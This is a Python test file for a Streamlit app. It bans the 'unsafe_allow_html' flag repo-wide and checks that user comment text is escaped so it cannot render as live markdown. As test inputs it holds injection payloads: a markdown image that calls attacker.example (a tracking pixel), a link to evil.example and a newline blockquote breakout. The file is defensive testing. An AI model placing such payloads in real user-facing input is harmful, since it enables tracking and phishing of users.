"""L2 contract test — SPEC §10 invariant 4.

"No HTML/script injection via comment text" — `unsafe_allow_html` banned
repo-wide, proven by a grep step. This is that grep step, run as a test so
it's part of the same `pytest` gate rather than a separate CI-only script
(SPEC's own suggested enforcement — "a grep step in CI, fails on any match"
— still holds; running it under pytest just means it's exercised locally
and in CI from the same command).
"""

from pathlib import Path

REPO_ROOT = Path(__file__).resolve().parent.parent
_EXCLUDED_DIRS = {".git", "__pycache__", ".pytest_cache", "venv", "env", "node_modules"}
_THIS_FILE = Path(__file__).resolve()


def test_unsafe_allow_html_never_appears_in_the_codebase():
    offenders = []
    for path in REPO_ROOT.rglob("*.py"):
        if path == _THIS_FILE:
            continue  # names the banned string in its own docstring/assert message
        if any(part in _EXCLUDED_DIRS for part in path.parts):
            continue
        text = path.read_text(encoding="utf-8", errors="ignore")
        if "unsafe_allow_html" in text:
            offenders.append(str(path.relative_to(REPO_ROOT)))
    assert not offenders, (
        "unsafe_allow_html found (SPEC §10 invariant 4 forbids it repo-wide): "
        + ", ".join(offenders)
    )


# ---------------------------------------------------------------------------
# The half of invariant 4 the grep above does not cover.
#
# `unsafe_allow_html` was treated as the whole of "no injection via comment
# text", and it is not. `st.markdown` renders *markdown* whether or not HTML
# is allowed, and markdown reaches the network on its own: a comment reading
# `![](https://attacker.example/p)` is a live image request fired from the
# creator's browser -- a tracking pixel with no tag and no script, so the
# grep stays green while the invariant is broken. These tests pin the actual
# behaviour rather than the absence of one flag.
# ---------------------------------------------------------------------------

import app  # noqa: E402 - kept below the block comment above, which explains what these tests pin


def test_an_image_comment_cannot_fire_a_request_from_the_report():
    """The payload that motivated this: zero HTML, still a network call."""
    rendered = app._as_literal_text("![](https://attacker.example/p?u=creator)")

    assert "![](" not in rendered
    assert rendered.startswith("\\!\\[")


def test_a_link_comment_renders_as_text_not_as_a_link():
    rendered = app._as_literal_text("[free robux](https://evil.example)")

    assert "](" not in rendered
    assert "free robux" in rendered  # the words survive; the link does not


def test_emphasis_and_code_syntax_survive_as_visible_characters():
    rendered = app._as_literal_text("**bold** _em_ `code`")

    for literal in ("**", "_", "`"):
        assert f"\\{literal[0]}" in rendered


def test_dollar_signs_do_not_become_latex():
    """Streamlit renders LaTeX between dollar signs -- a markdown special
    that is specific to this framework and easy to miss."""
    assert "\\$" in app._as_literal_text("costs $5 to $10")


def test_a_newline_cannot_break_out_of_the_blockquote():
    """Quotes render as `> {text}`. A bare newline ends the blockquote and
    lets everything after it render as top-level markdown -- the same escape
    through a different door."""
    rendered = app._as_literal_text("innocent first line\n# ATTACKER HEADING")

    assert "\n" not in rendered
    assert "\\#" in rendered


def test_ordinary_comments_are_left_readable():
    """Escaping that mangles normal text would just be a different bug."""
    assert app._as_literal_text("this finally made sense, thank you!") == (
        "this finally made sense, thank you\\!"
    )


def test_every_quote_render_site_escapes_its_text():
    """Three separate insight blocks each render quotes, and a fourth added
    later would be just as exposed. Fail if any of them interpolates a quote
    straight into markdown."""
    source = (REPO_ROOT / "app.py").read_text(encoding="utf-8")

    assert 'st.markdown(f"> {quote}")' not in source, (
        "a quote is being rendered without _as_literal_text"
    )
    assert source.count('st.markdown(f"> {_as_literal_text(quote)}")') == 3
